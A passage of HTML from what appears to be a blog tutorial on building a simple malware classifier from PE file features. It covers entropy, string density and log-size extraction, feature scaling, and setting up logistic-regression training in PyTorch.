</span></span><span class="highlight-line"><span class="highlight-line-content">    with open(binary_path, "rb") as f:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        raw_bytes = f.read()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    for b in raw_bytes:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        if b in printable and b not in b"\r\n\t":<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            current.append(b)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        else:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            if len(current) &gt;= min_len:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                count_strings += 1<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            current = bytearray()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if len(current) &gt;= min_len:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        count_strings += 1<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    strings_density = count_strings / file_size_kb<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    return np.array([weighted_entropy, strings_density, log_size], dtype=np.float32)</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Log-size provides a compact measure of scale, so huge installers don’t dominate numerics.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_l8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">    # Log(Size)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    file_size = os.path.getsize(binary_path)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    file_size_kb = max(file_size / 1024.0, 1e-6)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    log_size = math.log10(file_size + 1)</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The script uses pefile where available, gracefully falls back on safe defaults on parse errors, and writes <i class="font-italic">f1_entropy</i>,<i class="font-italic">f2_strings_density</i>,<i class="font-italic">f3_log_size</i>, <i class="font-italic">label</i> rows to pe_features.csv (labels are assigned manually per-directory), giving us a small, interpretable dataset to build intuition with.</p><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 table_tableWrapper__zr7LC"><div role="table" class="flex flex-col"><div role="rowgroup" class="flex flex-col w-full [&amp;>*+*]:border-t"><div class="table_row__LpfCG" role="row"><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start"><strong class="font-bold">f1_entropy</strong></p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start"><strong class="font-bold">f2_strings_density</strong></p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start"><strong class="font-bold">f3_log_size</strong></p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start"><strong class="font-bold">label</strong></p></div></div></div><div class="table_row__LpfCG" role="row"><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">6.0099654</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">2.7407408</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">5.043728</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">1</p></div></div></div><div class="table_row__LpfCG" role="row"><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">5.5360975</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">12.987317</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">4.891543</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">1</p></div></div></div><div class="table_row__LpfCG" role="row"><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">…</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">…</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">…</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">…</p></div></div></div><div class="table_row__LpfCG" role="row"><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">3.9541223</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">11.539474</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">4.891119</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">0</p></div></div></div><div class="table_row__LpfCG" role="row"><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">5.556493</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">14.348983</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">5.582483</p></div></div><div role="cell" class="table_cell__X_gFM" style="width:clamp(100px, calc((100% - 0px) / 4), 100%);min-width:clamp(100px, calc((100% - 0px) / 4), 100%)"><div class="blocks w-full space-y-2 lg:space-y-3 leading-normal self-center **:text-left text-left"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 decoration-primary/6 print:break-inside-avoid w-full max-w-[unset] text-start self-start justify-start">0</p></div></div></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-center self-center justify-center"><i class="font-italic">Sample of the extracted feature dataset</i></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">For this blog, I extracted only three features from the binaries to facilitate easy visualization in Euclidean space. Effectively, this makes plotting the data on an x-y-z axis pretty straightforward.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252FqQ6lvFADcxghFGbxJ6GJ%252Funknown.png%3Falt%3Dmedia%26token%3D1969ed08-e1e8-4dff-9407-0e868ed0525e&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=72c12c1&amp;sv=2" width="1000" height="700"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-center self-center justify-center"><i class="font-italic">Graph of Entropy v Strings Density v Log(Size)</i></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">It may be a little bit hard to see given the profile of the graph, but in the data above, there’s significant separation between the <i class="font-italic">benign </i>and the <i class="font-italic">malware</i>-labeled samples.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Before we can train a model on this data, we must consider the type of algorithm we will use. I went with a LogisticRegression in this case, which is an algorithm sensitive to feature scales. This means that the magnitude of the data impacts the model, so large values on one axis can become the dominant factors in a classification. To correct for this, we can use a StandardScaler to standardize the data and effectively equalize the importance of every feature in our dataset.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_178qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">    # Load dataset<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    df = pd.read_csv("pe_features.csv")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    X = df.drop(columns=["label"]).values<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    y = df["label"].values<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Normalize features<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    scaler = StandardScaler()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    X = scaler.fit_transform(X)</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-center self-center justify-center"><i class="font-italic">We load and normalize the data</i></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Once our data is normalized, we have to split the data. How we do this is a combination of preference and efficacy. Some implementations may split into training, validation, and test sets, but simple examples usually only split into training and test sets. We initialize the model and then loop through the training rounds, formally known as epochs, that we need to achieve the desired performance.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1d8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">    # Train/test split<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    X_train, X_test, y_train, y_test = train_test_split(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        X, y, test_size=0.20, random_state=42<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    )<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Create datasets &amp; loaders<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    train_dataset = PEDataset(X_train, y_train)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    test_dataset = PEDataset(X_test, y_test)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    train_loader = DataLoader(train_dataset, batch_size=20, shuffle=True)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    input_dim = X_train.shape[1]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    model = LogisticRegression(input_dim)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Loss and optimizer<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    criterion = nn.BCEWithLogitsLoss()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    optimizer = optim.SGD(model.parameters(), lr=0.01)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Training loop<!-- -->
</span></span><span class="highlight-line highlighted"><span class="highlight-line-content">    [...snip...]</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Once we’ve trained our LogisticRegression model, we need to save <strong class="font-bold">both</strong> the model and the scaler that we used to train our model. Having access to both of these is important.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1h8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">    # Save the model<!-- 